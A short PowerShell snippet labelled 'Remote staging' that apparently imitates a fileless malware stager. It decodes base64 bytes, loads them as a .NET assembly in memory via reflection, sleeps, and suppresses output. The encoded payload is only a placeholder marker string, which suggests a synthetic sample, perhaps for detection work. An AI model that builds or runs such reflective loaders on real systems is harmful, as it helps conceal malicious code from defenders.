# Remote staging
try { $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp5OTYwN25pajR2'); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); Start-Sleep -Seconds 20; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Stage transfer failed" }
